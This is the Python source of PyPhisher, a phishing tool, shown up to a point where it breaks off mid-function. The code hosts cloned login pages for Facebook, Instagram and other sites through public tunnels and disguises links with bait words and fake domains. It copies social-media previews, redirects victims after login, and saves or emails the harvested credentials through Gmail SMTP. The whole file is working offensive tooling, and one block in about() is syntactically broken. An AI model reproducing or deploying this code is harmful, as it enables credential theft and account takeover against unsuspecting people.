# -*- coding: UTF-8 -*-
# ToolName   : PyPhisher
# Author     : ERROR.2005.03
# Version    : 2.1
# License    : MIT
# Copyright  : ERROR.2005.03 (2021-2023)
# Github     : https://github.com/Error200503
# Contact    : https://t.me/error_2005_03
# Description: PyPhisher is a phishing tool in python
# Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
# 1st Commit : 08/08/2021
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : Zphisher, MaskPhish, AdvPhishing
# Env        : #!/usr/bin/env python

"""
MIT License

Copyright (c) 2021-2023 Error200503

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from argparse import ArgumentParser
from importlib import import_module as eximport
from hashlib import sha256
from json import (
    loads as parse
)
from os import (
    chmod,
    getenv,
    kill,
    listdir,
    makedirs,
    mkdir,
    mknod,
    popen,
    remove,
)
from os.path import (
    abspath,
    basename,
    dirname,
    isdir,
    isfile,
    join
)
from platform import uname
from re import search, sub
from shutil import (
    copy2,
    get_terminal_size,
    rmtree,
)
from signal import (
    SIGINT,
)
from subprocess import (
    DEVNULL,
    PIPE,
    Popen,
    run
)
from smtplib import SMTP_SSL as smtp
from sys import (
    stdout,
    version_info
)
from tarfile import open as taropen
from time import (
    sleep,
)
from zipfile import ZipFile


# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="2.1.6"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Modifying this could be potentially dangerous
logo = f"""
{red}  _____       _____  _     _     _               
{cyan} |  __ \     |  __ \| |   (_)   | |              
{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
{green}         __/ |{" "*19}       {cyan}[v{version[:3]}]
{cyan}        |___/  {" "*11}      {red}[By \69\114\114\111\114\46\50\48\48\53\46\48\51 ]
"""


lx_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://localxpose.io
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
"""
shadow_help="""
Shadow url is the url from which website previews are copied.
When sending url through social media like facebook/telegram, 
the previews are shown just below the url
"""
redir_help="""
Redirection url is the url which is used to redirect victim after successful login
"""
curl_help="""
Just a shortened url with your own masking
"""
zip_help="""
Add more templates from a zip file which will be downloaded from input url
"""


packages = [ "php", "ssh" ]
modules = [ "requests", "rich", "beautifulsoup4:bs4" ]
tunnelers = [ "cloudflared", "loclx" ]
processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]


try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    if ":" in module:
        module, importer = module.split(":")
    else:
        importer = module
    try:
        eximport(importer)
    except ImportError:
        try:
            print(f"Installing {module}")
            run(f"pip3 install {module} --break-system-packages", shell=True)
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    if ":" in module:
        module, importer = module.split(":")
    else:
        importer = module
    try:
        eximport(importer)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from bs4 import BeautifulSoup
from requests import (
    get,
    head,
    Session
)
from requests.exceptions import ConnectionError
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    Progress,
    TextColumn,
    TimeRemainingColumn,
    TransferSpeedColumn
)
from rich.traceback import install as override_default_traceback

override_default_traceback()
cprint = Console().print

# Get Columns of Screen
columns = get_terminal_size().columns

repo_url = "https://t.me/ \69\114\114\111\114\46\50\48\48\53\46\48\51"
websites_url = f"{repo_url}/releases/download/v{version[:3]}/websites.zip" # "https://github.com/Error200503/PyPhisher/releases/latest/download/websites.zip" 

# CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun

home = getenv("HOME")
ssh_dir = f"{home}/.ssh"
sites_dir = f"{home}/.websites"
templates_file = f"{sites_dir}/templates.json"
tunneler_dir = f"{home}/.tunneler"
php_file = f"{tunneler_dir}/php.log"
cf_file = f"{tunneler_dir}/cf.log"
lx_file = f"{tunneler_dir}/loclx.log"
lhr_file = f"{tunneler_dir}/lhr.log"
svo_file = f"{tunneler_dir}/svo.log"
site_dir = f"{home}/.site"
cred_file = f"{site_dir}/usernames.txt"
ip_file = f"{site_dir}/ip.txt"
main_ip = "ip.txt"
main_info = "info.txt"
main_cred = "creds.txt"
email_file = "files/email.json"
error_file = "error.log"
is_mail_ok = False
redir_url = ""
email = ""
password = ""
receiver = ""
mask = ""
default_port = 8080
default_tunneler = "Cloudflared"
default_template = "60"
cf_command = f"{tunneler_dir}/cloudflared"
lx_command = f"{tunneler_dir}/loclx"
if isdir("/data/data/com.termux/files/home"):
    termux = True
    cf_command = f"termux-chroot {cf_command}"
    lx_command = f"termux-chroot {lx_command}"
    saved_file = "/sdcard/.creds.txt"
else:
    termux = False
    saved_file = f"{home}/.creds.txt"


print(f"\n{info}Please wait!{nc}")

argparser = ArgumentParser()

argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"PyPhisher's server port [Default : {default_port}]")
argparser.add_argument("-o", "--option", help="PyPhisher's template index [Default : null]")
argparser.add_argument("-t", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
argparser.add_argument("-r", "--region", help="Region for loclx [Default: auto]")
argparser.add_argument("-s", "--subdomain", help="Subdomain for loclx [Pro Account] (Default: null)")
argparser.add_argument("-u", "--url", help="Redirection url after data capture [Default : null]")
argparser.add_argument("-m", "--mode", help="Mode of PyPhisher [Default: normal]")
argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
argparser.add_argument("--noupdate", help="Skip update checking [Default : False]", action="store_false")


args = argparser.parse_args()

port = args.port
option = args.option
region = args.region
subdomain = args.subdomain
tunneler = args.tunneler
url = args.url
mode = args.mode
troubleshoot = args.troubleshoot
key = args.nokey if mode != "test" else False
update = args.noupdate

local_url = f"127.0.0.1:{port}"

ts_commands = {
    "cloudflared": f"{cf_command} tunnel -url {local_url}",
    "localxpose": f"{lx_command} tunnel http -t {local_url}",
    "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
    "serveo": f"ssh -R 80:{local_url} serveo.net -T -n",
    "cf": f"{cf_command} tunnel -url {local_url}",
    "loclx": f"{lx_command} tunnel http -t {local_url}",
    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n",
    "svo": f"ssh -R 80:{local_url} serveo.net -T -n"
}


# My utility functions

# Check if a process is running by 'command -v' command. If it has a output exit_code will be 0 and package is already installed
def is_installed(package):
    return bgtask(f"command -v {package}").wait() == 0 # system(f"command -v {package} > /dev/null 2>&1")


# Check if a process is running by 'pidof' command. If pidof has a output exit_code will be 0 and process is running
def is_running(process):
    exit_code = bgtask(f"pidof {process}").wait()
    if exit_code == 0:
        return True
    return False


# Check if a json is valid
def is_json(myjson):
    try:
        parse(myjson)
        return True
    except:
        return False


# A simple copy function
def copy(path1, path2):
    if isdir(path1):
        if isdir(path2):
             rmtree(path2)
        for item in listdir(path1):
            old_file = join(path1, item)
            new_file = join(path2, item)
            if isdir(old_file):
                copy(old_file, new_file)
            else:
                makedirs(dirname(new_file), exist_ok=True)
                copy2(old_file, new_file)
        #copytree(path1, path2)
        #shell(f"cp -r {path1} {path2}")
    if isfile(path1):
        if isdir(path2):
            copy2(path1, path2)

# Delete files/folders if exist
def delete(*paths, recreate=False):
    for path in paths:
        if isdir(path):
            if recreate:
                rmtree(path)
                mkdir(path)
            else:
                rmtree(path)
        if isfile(path): 
            remove(path)


# A poor alternative of GNU/Linux 'cat' command returning file content
def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""


# Another poor alternative of GNU/Linux 'sed' command to replace and write
def sed(text1, text2, filename1, filename2=None, occurences=None):
    filedata1 = cat(filename1)
    if filename2 is None:
        filename2 = filename1
    if occurences is None:
        filedata2 = filedata1.replace(text1, text2)
    else:
        filedata2 = filedata1.replace(text1, text2, occurences)
    write(filedata2, filename2)
        
# Another poor alternative of GNU/Linux 'grep' command for regex search
def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""
    
# Run shell commands in python
def shell(command, capture_output=False):
    try:
        return run(command, shell=True, capture_output=capture_output)
    except Exception as e:
        append(e, error_file)
    # return run(command.split(" "), shell=True)
    # return call(command, shell=True)
    
# Run task in background supressing output by setting stdout and stderr to devnull
def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)
        
if sha256(logo.encode("utf-8")).hexdigest() != "931df196786d840c731d49fec1b43ab15edc7977f4e300bfb4c2e3657b9c591d":
    print(f"{info}Visit: {repo_url}")
    bgtask(f"xdg-open {repo_url}")
    delete(__file__)
    exit(1)


# Write/Append texts to a file
def write(text, filename):
    with open(filename, "w") as file:
        file.write(str(text)+"\n")


# Write/Append texts to a file
def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")
        
def get_ver(ver):
    return int(ver.replace(".", "", 2))

def get_meta(url):
    # Facebook requires some additional header
    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
    }
    if "facebook" in url:
        headers.update({
            "upgrade-insecure-requests": "1",
            "dnt": "1", 
            "content-type": "application/x-www-form-url-encoded",
            "origin": "https://m.facebook.com",
            "referer": "https://m.facebook.com/", 
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors", 
            "sec-fetch-user": "empty", 
            "sec-fetch-dest": "document", 
            "sec-ch-ua-platform": "Android",
            "accept-encoding": "gzip, deflate br" 
        })
    allmeta = ""
    try:
        response = get(url, headers=headers).text
        soup = BeautifulSoup(response, "html.parser")
        metas = soup.find_all("meta")
        if metas is not None and metas!=[]:
            allmeta = "\n".join([str(meta) for meta in metas])
    except Exception as e:
        append(e, error_file)
    return allmeta
    
# Replace the default ugly exception message
def exception_handler(e):
    lines_arr = []
    tb = e.__traceback__
    while tb is not None:
        if tb.tb_frame.f_code.co_filename == abspath(__file__):
            lines_arr.append(str(tb.tb_lineno))
        tb = tb.tb_next
    name = type(e).__name__
    append(e, error_file)
    if ":" in str(e):
        message = str(e).split(":")[0]
    elif "(" in str(e):
        message = str(e).split("(")[0]
    else:
        message = str(e)
    line_no = lines_arr[len(lines_arr) - 1]
    lines_no = ", ".join(lines_arr)
    print(f"{error}{name}: {message} at lines {lines_no}")



# Print lines slowly
def sprint(text, second=0.05):
    for line in text + '\n':
        stdout.write(line)
        stdout.flush()
        sleep(second)
        
# Prints colorful texts
def lolcat(text):
    if is_installed("lolcat"):
        run(["lolcat"], input=text, text=True)
    else:
        print(text)

# Center text 
def center_text(text):
    lines = text.splitlines()
    if len(lines) > 1:
        minlen = min([len(line) for line in lines if len(line)!=0]) + 8
        new_text = ""
        for line in lines:
            padding = columns + len(line) - minlen
            if columns % 2 == 0 and padding % 2 == 0:
                padding += 1
            new_text += line.center(padding) + "\n"
        return new_text
    else:
        return text.center(columns+8)


# Print decorated file content
def show_file_data(file):
    lines = cat(file).splitlines()
    text = ""
    for line in lines:
        text += f"[cyan][[green]*[cyan]][yellow] {line}\n"
    cprint(
        Panel(
            text.strip(),
            title="[bold green]\x50\x79\x50\x68\x69\x73\x68\x65\x72[/][cyan] Data[/]", 
            title_align="left",
            border_style="blue",
        )
    )

        
# Clear the screen and show logo
def clear(fast=False, lol=False):
    shell("clear")
    if fast:
        print(logo)
    elif lol:
        lolcat(logo)
    else:
        sprint(logo, 0.01)
        

# Install packages
def installer(package, package_name=None):
    if package_name is None:
        package_name = package
    for pacman in ["pkg", "apt", "apt-get", "apk", "yum", "dnf", "brew", "pacman", "yay"]:
        # Check if package manager is present but php isn't present
        if is_installed(pacman):
            if not is_installed(package):
                sprint(f"\n{info}Installing {package}{nc}")
                if pacman=="pacman":
                    shell(f"sudo {pacman} -S {package_name} --noconfirm")
                elif pacman=="apk":
                    if is_installed("sudo"):
                        shell(f"sudo {pacman} add {package_name}")
                    else:
                        shell(f"{pacman} add -y {package_name}")
                elif is_installed("sudo"):
                    shell(f"sudo {pacman} install -y {package_name}")
                else:
                    shell(f"{pacman} install -y {package_name}")
                break
    if is_installed("brew"):
        if not is_installed("cloudflare"):
            shell("brew install cloudflare/cloudflare/cloudflared")
        if not is_installed("localxpose"):
            shell("brew install localxpose")


# Process killer
def killer():
    # Previous instances of these should be stopped
    for process in processes:
        if is_running(process):
            # system(f"killall {process}")
            output = shell(f"pidof {process}", True).stdout.decode("utf-8").strip()
            if " " in output:
                for pid in output.split(" "):
                    kill(int(pid), SIGINT)
            elif output != "":
                kill(int(output), SIGINT)
            else:
                print()

# Internet Checker

def internet(url="https://api.github.com", timeout=5):
    while update:
        try:
            head(url=url, timeout=timeout)
            break
        except ConnectionError:
            print(f"\n{error}No internet!{nc}\007")
            sleep(2)
        except Exception as e:
            print(f"{error}{str(e)}")

        
# Send mail by smtp library
def send_mail(msg):
    global email, password, receiver
    message = f"From: {email}\nTo: {receiver}\nSubject: \x50\x79\x50\x68\x69\x73\x68\x65\x72 Login Credentials\n\n{msg}"
    try:
        internet()
        with smtp('smtp.gmail.com', 465) as server:
            server.login(email, password)
            server.sendmail(email, receiver, message) 
    except Exception as e:
        append(e, error_file)
        print(f"{error}{str(e)}")



# Bytes to KB, MB converter
def readable(byte, precision = 2, is_speed = False):
    for unit in ["Bt","KB","MB","GB"]:
        floatbyte = round(byte, precision)
        space = ' ' * (6 - len(str(floatbyte)))
        if byte < 1024.0:
            if is_speed:
                size = f"{floatbyte} {unit}/s{space}"
            else:
                size = f"{floatbyte} {unit}{space}"
            break
        byte /= 1024.0
    return size

# Dowbload files with progress bar(if necessary)
def download(url, path):
    session = Session()
    filename = basename(path)
    directory = dirname(path)
    retry = 3
    if directory!="" and not isdir(directory):
        mkdir(directory)
    newfile = filename.split(".")[0] if "." in filename else filename
    for i in range(retry):
        try:
            print()
            with open(path, "wb") as file:
                response = session.get(url, stream=True, timeout=20)
                total_length = response.headers.get('content-length')
                if total_length is None: # no content length header
                    file.write(response.content)
                else:
                    total_length = int(total_length)
                    with Progress(
                        TextColumn("[bold blue]{task.fields[filename]}", justify="right"),
                        BarColumn(bar_width=None),
                        "[progress.percentage]{task.percentage:>3.1f}%",
                        "•",
                        TransferSpeedColumn(),
                        "•",
                        TimeRemainingColumn()
                    ) as progress:
                        task = progress.add_task(newfile, total=total_length, filename=newfile.title())
                        for data in response.iter_content(chunk_size=4096):
                            file.write(data)
                            progress.update(task, advance=len(data))
                break
        except Exception as e:
            remove(path)
            append(e, error_file)
            print(f"\n{error}Download failed due to: {str(e)}")
            print(f"\n{info}Retrying {i}/{retry}{nc}")
            sleep(1)
    if not isfile(path):
        print(f"\n{error}Download failed permanently!")
        pexit()

# Extract zip/tar/tgz files
def extract(file, extract_path='.', pwd=None):
    directory = dirname(extract_path)
    if directory!="" and not isdir(directory):
        mkdir(directory)
    try:
        if ".zip" in file:
            with ZipFile(file, 'r') as zip_ref:
                try:
                    if pwd is None:
                        zip_ref.extractall(extract_path)
                    else:
                        try:
                            zip_ref.extractall(extract_path, pwd=bytes(pwd, "utf-8"))
                        except:
                            print(f"\n{error}Wrong password!")
                            delete(file)
                            exit()
                except:
                    print(f"\n{error}Zip file corrupted!")
                    delete(file)
                    exit()
            return
        tar = taropen(file, 'r')
        for item in tar:
            tar.extract(item, extract_path)
            # Recursion if childs are tarfile
            if ".tgz" in item.name or ".tar" in item.name:
                extract(item.name, "./" + item.name[:item.name.rfind('/')])
    except Exception as e:
        append(e, error_file)
        delete(file)
        print(f"{error}{str(e)}")
        exit(1)
        


def write_meta():
    global mode, url
    if mode == "test":
        return
    while True:
        if url is None or url == "":
            metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
        else:
            metaurl = url
        if metaurl=="":
            break
        elif metaurl == "help":
            sprint(shadow_help)
        else:
            allmeta = get_meta(metaurl)
            if allmeta=="":
                print(f"\n{error}No preview generated from specified URL!")
            write(allmeta, f"{site_dir}/meta.php")
            break


def write_redirect():
    global url, redir_url
    while True:
        if url is None or url == "":
            redirect_url = input(f"\n{ask}{bcyan}Enter redirection url{bcyan}[{red}press enter to skip{bcyan}] : {green}")
        else:
            redirect_url = url
        if redirect_url is None or redirect_url == "":
            redirect_url = redir_url
            sed("redirectUrl", redirect_url, f"{site_dir}/login.php")
            break
        else:
            sed("redirectUrl", redirect_url, f"{site_dir}/login.php")
            break
        if redirect_url == "help":
            sprint(shadow_help)

# Add more templates from zipfile from url
def add_zip():
    while True:
        zip_url = input(f"\n{ask}Enter the download url of zipfile: ")
        if zip_url is None or zip_url == "":
            sprint(f"\n{error}No URL specified!")
            break
        elif zip_url=="help":
            sprint(zip_help)
        else:
            download(zip_url, "sites.zip")
            pwd = input(f"\n{ask}Enter the password of zipfile: ")
            extract("sites.zip", sites_dir, pwd)
            remove("sites.zip")
            break

# Polite Exit
def pexit():
    killer()
    sprint(f"\n{info2}Thanks for using!\n{nc}")
    exit(0)


# Website chooser
def show_options(sites):
    total_sites = len(sites)
    def optioner(index, max_len):
        # Avoid RangeError/IndexError
        if index >= total_sites:
            return ""
        # Add 0 before single digit number
        new_index = str(index+1) if index >= 9 else "0"+str(index+1) 
        # To fullfill max length of a part we append empty space
        space = " " * (max_len - len(sites[index]))
        return f"{green}[{white}{new_index}{green}] {yellow}{sites[index]}{space}"
    # Array index starts from 0
    first_index = 0
    # Three columns
    one_third = int(total_sites/3)
    # If there is modulus, that means some entries are remaining, we need an extra row
    if total_sites%3 > 0:
        one_third += 1
    options = "\n\n"
    # First index of last line should be less than one-third of total
    while first_index < one_third and total_sites > 10:
        second_index = first_index + one_third
        third_index = second_index + one_third
        options += optioner(first_index, 23) + optioner(second_index, 17) + optioner(third_index, 1) + "\n"
        first_index += 1
    if total_sites < 10:
        for i in range(total_sites):
            options += optioner(i, 20) + "\n"
    options += "\n"
    if isfile(saved_file) and cat(saved_file)!="":
        options += f"{green}[{white}a{green}]{yellow} About  {green}[{white}o{green}]{yellow} AddZip  {green}[{white}s{green}]{yellow} Saved   {green}[{white}x{green}]{yellow} More Tools  {green}[{white}0{green}]{yellow} Exit\n\n"
        #options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} More Tools      {green}[{white}0{green}]{yellow} Exit\n\n"
    else:
        options += f"{green}[{white}a{green}]{yellow} About       {green}[{white}o{green}]{yellow} AddZip      {green}[{white}x{green}]{yellow} More Tools     {green}[{white}0{green}]{yellow} Exit\n\n"
        #options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}m{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
    lolcat(options)


# Set up loclx authtoken to work with loclx links
def lx_token():
    global lx_command
    while True:
        status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
        if not "error" in status:
            break
        has_token = input(f"\n{ask}Do you have loclx authtoken? [y/N/help]: {green}")
        if has_token == "y":
            shell(f"{lx_command} account login")
            break
        elif has_token == "help":
            sprint(lx_help, 0.01)
            sleep(3)
        elif has_token in ["n", ""]:
            break
        else:
            print(f"\n{error}Invalid input '{has_token}'!")
            sleep(1)

def ssh_key():
    if key and not isfile(f"{ssh_dir}/id_rsa"):
        # print(f"\n{info}Please wait for a while! Press enter three times when asked for ssh key generation{nc}\n")
        # sleep(1)
        # shell("ssh-keygen")
        print(nc)
        shell(f"mkdir -p {ssh_dir} && ssh-keygen -N '' -t rsa -f {ssh_dir}/id_rsa")
    is_known = bgtask("ssh-keygen -F localhost.run").wait()
    if is_known != 0:
        shell(f"ssh-keyscan -H localhost.run >> {ssh_dir}/known_hosts", True)
    is_known2 = bgtask("ssh-keygen -F serveo.net").wait()
    if is_known2 != 0:
        shell(f"ssh-keyscan -H serveo.net >> {ssh_dir}/known_hosts", True)


# Output urls
def url_manager(url, tunneler):
    global mask
    masked = mask + "@" + url.replace('https://','')
    title = f"[bold cyan]{tunneler}[/]"
    text = f"[blue]URL[/] [green]:[/] [yellow]{url}[/]\n[blue]MaskedURL[/] [green]:[/] [yellow]{masked}[/]"
    cprint(
        Panel(
            text,
            title=title,
            title_align="left",
            border_style="green"
        )
    )
    #print(f"\n{info2}{arg1} > {yellow}{url}")
    #print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
    sleep(0.5)


def shortener1(url):
    website = "https://is.gd/create.php?format=simple&url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        append(e, error_file)
        res = ""
    shortened = res.split("\n")[0] if "\n" in res else res
    if "https://" not in shortened:
        return ""
    return shortened

def shortener2(url):
    website = "https://api.shrtco.de/v2/shorten?url="+url.strip()
    internet()
    try:
        res = get(website).text
        json_resp = parse(res)
    except Exception as e:
        append(e, error_file)
        json_resp = ""
    if json_resp != "":
        if json_resp["ok"]:
            return json_resp["result"]["full_short_link"]
    return ""

def shortener3(url):
    website = "https://tinyurl.com/api-create.php?url="+url.strip()
    internet()
    try:
        res = get(website).text
    except Exception as e:
        append(e, error_file)
        res = ""
    shortened = res.split("\n")[0] if "\n" in res else res
    if "https://" not in shortened:
        return ""
    return shortened
    
# Copy website files from custom location
def customfol():
    global mask
    while True:
        has_files = input(f"\n{ask}Do you have custom site files?[y/N/b] > {green}")
        if has_files == "y":
            fol = input(f"\n{ask}Enter the directory > {green}")
            if isdir(fol):
                if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html"):
                    inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
                    # Remove slash and spaces from mask
                    mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
                    delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
                    copy(fol, site_dir)
                    return fol
                else:
                    sprint(f"\n{error}index.php/index.html is required but not found!")
            else:
                sprint(f"\n{error}Directory doesn't exist!")
        elif has_files == "b":
            main_menu()
        else:
            sprint(f"\n{info}Contact  \69\114\114\111\114\46\50\48\48\53\46\48\51")
            bgtask("xdg-open https://t.me/ \69\114\114\111\114\95\50\48\48\53\95\48\51")
            pexit()

# Show saved data from saved file with small decoration
def saved():
    clear()
    print(f"\n{info}Saved details: \n{nc}")
    show_file_data(saved_file)
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
    else:
        return
# Info about tool
def about():
    clear()
    print(f"{red}{yellow}[{purple}ToolName{yellow}] {cyan}: {yellow}[{green}\x50\x79\x50\x68\x69\x73\x68\x65\x72{yellow}] ")
    print(f"{red}{yellow}[{purple}Version{yellow}] {cyan}: {yellow}[{green}{version}{yellow}] ")
    print(f"{red}{yellow}[{purple}Author{yellow}] {cyan}: {yellow}[{green}\69\114\114\111\114\46\50\48\48\53\46\48\51{yellow}] ")
    print(f"{red}{yellow}[{purple}Github{yellow}] {cyan}: {yellow}[{green}https://github.com/\69\114\114\111\114\46\50\48\48\53\46\48\51{purple}{yellow}] ")
    print(f"{red}{yellow}[{purple}Messenger{yellow}] {cyan}: {yellow}[{green}https://m.me/\69\114\114\111\114\46\50\48\48\53\46\48\51{yellow}] ")
    print(f"{red}{yellow}[{purple}Telegram {yellow}] {cyan}: {yellow}[{green}https://t.me/\69\114\114\111\114\95\50\48\48\53\95\48\51{yellow}] ")
    print(f"{red}{yellow}[{purple}Email{yellow}] {cyan}: {yellow}[{green}\99\114\101\97\116\105\118\101\119\111\114\108\100\46\118\101\100\105\111\64\103\109\97\105\108\46\99\111\109/{yellow}] ")
    print(f"\n{green}[{white}0{green}]{yellow}Exit {green}[{white}x{green}]{yellow}Main Menu \n")
    inp=input(f"\n{ask}Choose your option: {green}")
    if inp=="0":
        pexit()
else:
return

# Optional function for url masking
def masking(url):
    cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y/N/help] : {yellow}")
    if cust in [ "", "n", "N", "no" ]:
        return
    if cust == "help":
        print(curl_help)
    if (shortened:=shortener1(url)) != "":
        pass
    elif (shortened:=shortener2(url)) != "":
        pass
    elif (shortened:=shortener3(url)) != "":
        pass
    else:
        sprint(f"{error}Service not available!")
        waiter()
    short = shortened.replace("https://", "")
    # Remove slash and spaces from inputs
    domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
    if domain == "":
        sprint(f"\n{error}No domain!")
        domain = "https://"
    else:
        domain = "https://" + sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
    bait = input(f"\n{ask}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > ")
    if bait=="":
        sprint(f"\n{error}No bait word!")
        if domain!="https://":
            bait = "@"
    else:
        if domain!="https://":
            bait = "-" + sub("([/%+&?={} ])", "-", bait) + "@"
        else:
            bait = sub("([/%+&?={} ])", "-", bait) + "@"
    final = domain+bait+short
    print()
    #sprint(f"\n{success}Your custom url is > {bcyan}{final}")
    title = "[bold blue]Custom[/]"
    text = f"[cyan]URL[/] [green]:[/] [yellow]{final}[/]"
    cprint(
        Panel(
            text,
            title=title,
            title_align="left",
            border_style="blue",
        )
    )


# Staring functions

# Update of PyPhisher
def updater():
    internet()
    if not isfile("files/pyphisher.gif"):
        return
    try:
        toml_data = get("https://raw.githubusercontent.com/Error200503/PyPhisher/main/files/pyproject.toml").text
        pattern = r'version\s*=\s*"([^"]+)"'
        match = search(pattern, toml_data)
        if match:
            gh_ver = match.group(1)
        else:
            gh_ver = "404: Not Found"
    except Exception as e:
        append(e, error_file)
        gh_ver = version
    if gh_ver != "404: Not Found" and get_ver(gh_ver) > get_ver(version):
        # Changelog of each versions are seperated by three empty lines
        changelog = get("https://raw.githubusercontent.com/Error200503/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
        clear(fast=True)
        print(f"{info}\x50\x79\x50\x68\x69\x73\x68\x65\x72 has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{gh_ver}")
        upask=input(f"\n{ask}Do you want to update \x50\x79\x50\x68\x69\x73\x68\x65\x72?[y/n] > {green}")
        if upask=="y":
            print(nc)
            shell(f"cd .. && rm -rf PyPhisher pyphisher && git clone {repo_url}")
            sprint(f"\n{success}\x50\x79\x50\x68\x69\x73\x68\x65\x72 has been updated successfully!! Please restart terminal!")
            if (changelog != "404: Not Found"):
                sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
            exit()
        elif upask=="n":
            print(f"\n{info}Updating cancelled. Using old version!")
            sleep(2)
        else:
            print(f"\n{error}Wrong input!\n")
            sleep(2)

# Installing packages and downloading tunnelers
def requirements():
    global termux, cf_command, lx_command, is_mail_ok, email, password, receiver
    # Termux may not have permission to write in saved_file.
    # So we check if /sdcard is readable.
    # If not execute termux-setup-storage to prompt user to allow
    if termux:
        for retry in range(2):
            try:
                if not isfile(saved_file):
                    mknod(saved_file)
                with open(saved_file) as checkfile:
                    data = checkfile.read()
                break
            except (PermissionError, OSError):
                shell("termux-setup-storage")
            except Exception as e:
                print(f"{error}{str(e)}")
            if retry == 1:
                print(f"\n{error}You haven't allowed storage permission for termux. Closing \x50\x79\x50\x68\x69\x73\x68\x65\x72!\n")
                sleep(2)
                pexit()
    internet()
    if termux:
        if not is_installed("proot"):
